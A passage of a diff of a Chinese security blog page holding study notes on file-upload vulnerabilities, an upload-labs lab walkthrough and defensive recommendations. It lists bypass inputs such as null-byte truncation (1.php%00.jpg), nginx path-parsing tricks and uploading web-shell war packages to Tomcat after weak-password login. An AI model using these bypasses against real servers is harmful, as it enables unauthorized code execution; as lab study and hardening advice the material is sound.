+上传一个正常的jpg图片 查看上传点是否可用
+
+上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）
+
+上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg
+
+判断服务器是什么类型，web服务器程序，是什么类型，版本号多少
+
+利用解析漏洞</code></pre>
+<h4 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h4><ol>
+<li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）</li>
+<li>验证文件内容，使用正则匹配恶意代码限制上传</li>
+<li>对上传后的文件统一随机命名，不允许用户控制扩展名</li>
+<li>修复服务器可能存在的解析漏洞</li>
+<li>严格限制可以修改服务器配置的文件上传如：.htaccess</li>
+<li>隐藏上传文件路径。</li>
+<li>升级Web Server</li>
+<li>及时修复Web上传代码（重要）</li>
+<li>不能有本地文件包含漏洞</li>
+<li>注意0x00截断攻击（PHP更新到最新版本）</li>
+<li>上传文件的存储目录禁用执行权限</li>
+</ol>
+<h3 id="文件上传漏洞的主要利用和绕过方式总结。"><a href="#文件上传漏洞的主要利用和绕过方式总结。" class="headerlink" title="文件上传漏洞的主要利用和绕过方式总结。"></a>文件上传漏洞的主要利用和绕过方式总结。</h3><p><strong>1.前端JS绕过</strong></p>
 <p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
 <p><strong>2.MIME 类型验证</strong></p>
 <p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
@@ -393,7 +847,7 @@
 <p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
 <p>​            upload/image/1.jpg/.php</p>
 <p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
-<h4 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h4><p><strong>upolad-labs考察知识点汇总：</strong></p>
+<h3 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h3><p><strong>upolad-labs考察知识点汇总：</strong></p>
 <img src="11525934-e19630249b9b8764.png"  />
 
 
@@ -475,6 +929,19 @@
 <h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p>
 <p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>
+<h5 id="拓展资料"><a href="#拓展资料" class="headerlink" title="拓展资料"></a>拓展资料</h5><ul>
+<li><a href="http://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">http://thief.one/2016/09/21/服务器解析漏洞/</a></li>
+</ul>
+<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul>
+<li><a href="http://www.y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/" target="_blank" rel="noopener">文件上传漏洞解析及绕过姿势</a></li>
+<li><a href="http://www.cnblogs.com/stevenwuzheng/p/5354236.html" target="_blank" rel="noopener">http://www.cnblogs.com/stevenwuzheng/p/5354236.html</a></li>
+<li><a href="https://blog.csdn.net/weiwangchao_/article/details/46686505" target="_blank" rel="noopener">https://blog.csdn.net/weiwangchao_/article/details/46686505</a></li>
+<li><a href="http://www.myh0st.cn/index.php/archives/7/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/7/</a></li>
+<li><a href="http://rdc.hundsun.com/portal/article/627.html" target="_blank" rel="noopener">http://rdc.hundsun.com/portal/article/627.html</a></li>
+<li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结</a></li>
+<li><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li>
+<li><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/" target="_blank" rel="noopener">http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</a></li>
+</ul>
 
       
     </div>
@@ -489,6 +956,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag"># 文件上传漏洞</a>
+          
+        </div>
       
 
       
@@ -509,8 +982,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi/" rel="prev" title="文件上传漏洞学习">
-                文件上传漏洞学习 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/" rel="prev" title="渗透测试——Mestasploit基本使用">
+                渗透测试——Mestasploit基本使用 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -588,7 +1061,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -599,7 +1072,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -610,7 +1083,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">21</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -643,7 +1116,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传-文件包含漏洞学习笔记-靶场实战"><span class="nav-number">1.</span> <span class="nav-text">文件上传+文件包含漏洞学习笔记+靶场实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传漏洞部分"><span class="nav-number">1.1.</span> <span class="nav-text">文件上传漏洞部分</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">1.1.0.1.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#靶场：upload-labs-实战总结"><span class="nav-number">1.1.0.2.</span> <span class="nav-text">靶场：upload-labs 实战总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-01-前端js检测"><span class="nav-number">1.1.0.2.1.</span> <span class="nav-text">Pass-01-前端js检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-02-只检测Content-type"><span class="nav-number">1.1.0.2.2.</span> <span class="nav-text">Pass-02 只检测Content-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-03-黑名单绕过"><span class="nav-number">1.1.0.2.3.</span> <span class="nav-text">Pass-03 黑名单绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-04-htaccess绕过"><span class="nav-number">1.1.0.2.4.</span> <span class="nav-text">Pass-04  .htaccess绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-05-大小写绕过"><span class="nav-number">1.1.0.2.5.</span> <span class="nav-text">Pass-05 大小写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-06-空格绕过"><span class="nav-number">1.1.0.2.6.</span> <span class="nav-text">Pass-06 空格绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-07-点绕过"><span class="nav-number">1.1.0.2.7.</span> <span class="nav-text">Pass-07 点绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-08-DATA绕过"><span class="nav-number">1.1.0.2.8.</span> <span class="nav-text">Pass-08  ::$DATA绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-09-点空格点绕过"><span class="nav-number">1.1.0.2.9.</span> <span class="nav-text">Pass-09 点空格点绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-10-双写绕过"><span class="nav-number">1.1.0.2.10.</span> <span class="nav-text">Pass-10 双写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-11-get-00截断"><span class="nav-number">1.1.0.2.11.</span> <span class="nav-text">Pass-11 get 00截断</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pass-13"><span class="nav-number">1.1.0.3.</span> <span class="nav-text">Pass-13</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#文件上传漏洞学习笔记-靶场实战"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞学习笔记+靶场实战</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一-什么是文件上传漏洞"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">一.什么是文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文件上传中常见的函数错误"><span class="nav-number">1.0.0.1.1.</span> <span class="nav-text">文件上传中常见的函数错误</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#历史经典漏洞再次爆发"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">历史经典漏洞再次爆发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#校验方式分类-amp-总结"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">校验方式分类&amp;总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#校验方式溯源"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">校验方式溯源</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#校验方式-amp-绕过姿势"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">校验方式&amp;绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PUT方法"><span class="nav-number">1.0.0.5.1.</span> <span class="nav-text">PUT方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#客户端校验"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">客户端校验</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#JavaScript校验"><span class="nav-number">1.0.0.6.1.</span> <span class="nav-text">JavaScript校验</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过姿势"><span class="nav-number">1.0.0.6.2.</span> <span class="nav-text">绕过姿势</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器端校验"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">服务器端校验</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文件头content-type字段校验（服务端MIME类型检测）"><span class="nav-number">1.0.0.7.1.</span> <span class="nav-text">文件头content-type字段校验（服务端MIME类型检测）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MIME类型介绍"><span class="nav-number">1.0.0.7.2.</span> <span class="nav-text">MIME类型介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#MIME类型格式："><span class="nav-number">1.0.0.7.2.1.</span> <span class="nav-text">MIME类型格式：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MIME主类别："><span class="nav-number">1.0.0.7.2.2.</span> <span class="nav-text">MIME主类别：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#常见MIME类型："><span class="nav-number">1.0.0.7.2.3.</span> <span class="nav-text">常见MIME类型：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#验证代码"><span class="nav-number">1.0.0.7.3.</span> <span class="nav-text">验证代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过方式"><span class="nav-number">1.0.0.7.4.</span> <span class="nav-text">绕过方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务端文件扩展名检测"><span class="nav-number">1.0.0.8.</span> <span class="nav-text">服务端文件扩展名检测</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#测试代码"><span class="nav-number">1.0.0.8.1.</span> <span class="nav-text">测试代码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过技巧"><span class="nav-number">1.0.0.8.2.</span> <span class="nav-text">绕过技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#配合Apache的-htaccess文件上传解析漏洞"><span class="nav-number">1.0.0.8.2.1.</span> <span class="nav-text">配合Apache的.htaccess文件上传解析漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Apache站上的解析缺陷绕过上传漏洞"><span class="nav-number">1.0.0.8.2.2.</span> <span class="nav-text">Apache站上的解析缺陷绕过上传漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#IIS6-0站上的目录路径检测解析绕过上传漏洞"><span class="nav-number">1.0.0.8.2.3.</span> <span class="nav-text">IIS6.0站上的目录路径检测解析绕过上传漏洞</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#IIS6-0站上的解析缺陷绕过上传漏洞"><span class="nav-number">1.0.0.8.2.4.</span> <span class="nav-text">IIS6.0站上的解析缺陷绕过上传漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务端检测文件内容"><span class="nav-number">1.0.0.9.</span> <span class="nav-text">服务端检测文件内容</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#配合文件包含漏洞"><span class="nav-number">1.0.0.9.1.</span> <span class="nav-text">配合文件包含漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用PHP特性（使用数组绕过）"><span class="nav-number">1.0.0.9.2.</span> <span class="nav-text">利用PHP特性（使用数组绕过）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务端检测文件头"><span class="nav-number">1.0.0.10.</span> <span class="nav-text">服务端检测文件头</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文件头简介"><span class="nav-number">1.0.0.10.1.</span> <span class="nav-text">文件头简介</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过方式-1"><span class="nav-number">1.0.0.10.2.</span> <span class="nav-text">绕过方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#上传到服务端后验证"><span class="nav-number">1.0.0.11.</span> <span class="nav-text">上传到服务端后验证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#竞争上传"><span class="nav-number">1.0.0.11.1.</span> <span class="nav-text">竞争上传</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#针对各种CMS"><span class="nav-number">1.0.0.12.</span> <span class="nav-text">针对各种CMS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#针对各种编辑器漏洞"><span class="nav-number">1.0.0.12.1.</span> <span class="nav-text">针对各种编辑器漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文本编辑器"><span class="nav-number">1.0.0.12.2.</span> <span class="nav-text">文本编辑器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-FCKeditor"><span class="nav-number">1.0.0.12.3.</span> <span class="nav-text">1 FCKeditor</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-eWebEditor"><span class="nav-number">1.0.0.12.4.</span> <span class="nav-text">2 eWebEditor</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#针对各种WAF"><span class="nav-number">1.0.0.13.</span> <span class="nav-text">针对各种WAF</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-垃圾数据"><span class="nav-number">1.0.0.13.1.</span> <span class="nav-text">1 垃圾数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-filename"><span class="nav-number">1.0.0.13.2.</span> <span class="nav-text">2 filename</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-POST-GET"><span class="nav-number">1.0.0.13.3.</span> <span class="nav-text">3 POST&#x2F;GET</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-以上方式"><span class="nav-number">1.0.0.13.4.</span> <span class="nav-text">4 以上方式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-利用waf本身缺陷"><span class="nav-number">1.0.0.13.5.</span> <span class="nav-text">5 利用waf本身缺陷</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#删除实体里面的Conten-Type字段"><span class="nav-number">1.0.0.13.5.1.</span> <span class="nav-text">删除实体里面的Conten-Type字段</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#删除Content-Disposition字段里的空格"><span class="nav-number">1.0.0.13.5.2.</span> <span class="nav-text">删除Content-Disposition字段里的空格</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#修改Content-Disposition字段值的大小写"><span class="nav-number">1.0.0.13.5.3.</span> <span class="nav-text">修改Content-Disposition字段值的大小写</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Boundary边界不一致"><span class="nav-number">1.0.0.13.5.4.</span> <span class="nav-text">Boundary边界不一致</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#文件名处回车"><span class="nav-number">1.0.0.13.5.5.</span> <span class="nav-text">文件名处回车</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#多个Content-Disposition"><span class="nav-number">1.0.0.13.5.6.</span> <span class="nav-text">多个Content-Disposition</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用NTFS-ADS特性"><span class="nav-number">1.0.0.13.6.</span> <span class="nav-text">利用NTFS ADS特性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#文件重命名绕过"><span class="nav-number">1.0.0.13.7.</span> <span class="nav-text">文件重命名绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#特殊的长文件名绕过"><span class="nav-number">1.0.0.13.8.</span> <span class="nav-text">特殊的长文件名绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#反删除"><span class="nav-number">1.0.0.13.9.</span> <span class="nav-text">反删除</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">1.0.0.14.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#防护建议"><span class="nav-number">1.0.0.15.</span> <span class="nav-text">防护建议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞的主要利用和绕过方式总结。"><span class="nav-number">1.0.1.</span> <span class="nav-text">文件上传漏洞的主要利用和绕过方式总结。</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶场：upload-labs-实战总结"><span class="nav-number">1.0.2.</span> <span class="nav-text">靶场：upload-labs 实战总结</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-01-前端js检测"><span class="nav-number">1.0.2.0.1.</span> <span class="nav-text">Pass-01-前端js检测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-02-只检测Content-type"><span class="nav-number">1.0.2.0.2.</span> <span class="nav-text">Pass-02 只检测Content-type</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-03-黑名单绕过"><span class="nav-number">1.0.2.0.3.</span> <span class="nav-text">Pass-03 黑名单绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-04-htaccess绕过"><span class="nav-number">1.0.2.0.4.</span> <span class="nav-text">Pass-04  .htaccess绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-05-大小写绕过"><span class="nav-number">1.0.2.0.5.</span> <span class="nav-text">Pass-05 大小写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-06-空格绕过"><span class="nav-number">1.0.2.0.6.</span> <span class="nav-text">Pass-06 空格绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-07-点绕过"><span class="nav-number">1.0.2.0.7.</span> <span class="nav-text">Pass-07 点绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-08-DATA绕过"><span class="nav-number">1.0.2.0.8.</span> <span class="nav-text">Pass-08  ::$DATA绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-09-点空格点绕过"><span class="nav-number">1.0.2.0.9.</span> <span class="nav-text">Pass-09 点空格点绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-10-双写绕过"><span class="nav-number">1.0.2.0.10.</span> <span class="nav-text">Pass-10 双写绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Pass-11-get-00截断"><span class="nav-number">1.0.2.0.11.</span> <span class="nav-text">Pass-11 get 00截断</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pass-13"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">Pass-13</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#拓展资料"><span class="nav-number">1.0.2.1.1.</span> <span class="nav-text">拓展资料</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考资料"><span class="nav-number">1.0.2.1.2.</span> <span class="nav-text">参考资料</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
             
 
           </div>
